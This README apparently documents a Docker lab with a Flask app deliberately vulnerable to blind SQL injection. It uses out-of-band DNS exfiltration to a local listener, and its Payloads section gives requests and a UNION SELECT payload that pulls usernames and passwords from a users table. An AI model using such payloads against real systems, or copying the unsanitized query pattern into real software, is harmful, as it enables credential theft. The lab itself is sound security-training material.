# Blind SQLi Lab with DNS Exfiltration (Out-of-Band)

This lab simulates a vulnerable web application that is susceptible to blind SQL injection. The application uses user input to perform DNS resolution on a hostname retrieved from a database, allowing for **out-of-band (OOB)** data exfiltration via DNS queries to a controlled server.

## 🧪 Lab Components

- **Flask Web App (`/web`)**: 
  - A vulnerable endpoint `/search?id=<number>` executes an unsanitized SQL query.
  - It uses `nslookup` to resolve a hostname retrieved from the database.
  - Optional parameter: `set-dns=<IP>` to specify a custom DNS server for resolution.

- **DNS Listener (`/dns-server`)**:
  - A Python script that runs a simple UDP DNS server and logs incoming raw DNS queries for analysis.

- **Docker**:
  - Docker Compose is used to run both services in isolated containers.

---

## 🛠️ How to Run the Lab

### Clone this repo


### Run containers

	sudo docker-compose build --no-cache
	
This will:

- Start the vulnerable web app at http://localhost:8080

- Start the DNS listener: default port UDP 53, internal docker net IP 172.20.53.53


### Payloads

- Using default DNS: this performs a lookup to www.google.it using default DNS -> OK
	
	  /search?id=1
	
Check web app console log

	web_1         | Server:         127.0.0.11
	web_1         | Address:        127.0.0.11#53
	web_1         | 
	web_1         | Non-authoritative answer:
	web_1         | Name:   www.google.it
	web_1         | Address: 216.58.204.227
	web_1         | Name:   www.google.it
	web_1         | Address: 2a00:1450:4002:415::2003
	web_1         | 
	web_1         | 172.20.53.1 - - [09/Jul/2025 08:31:51] "GET /search?id=1 HTTP/1.1" 200 -

	
	UNION SELECT (SELECT username || '-' || password FROM users WHERE id=1)
	
- Using custom DNS: this perform the same lookup query using our controlled DNS to resolve it -> Error (but it's expected)

      /search?set-dns=172.20.53.53&id=1 
	
	UNION SELECT (SELECT username || '-' || password FROM users WHERE id=1)
	



## Stop containers

	sudo docker compose down 
	
## Rebuild containers
	
	sudo docker-compose build --no-cache
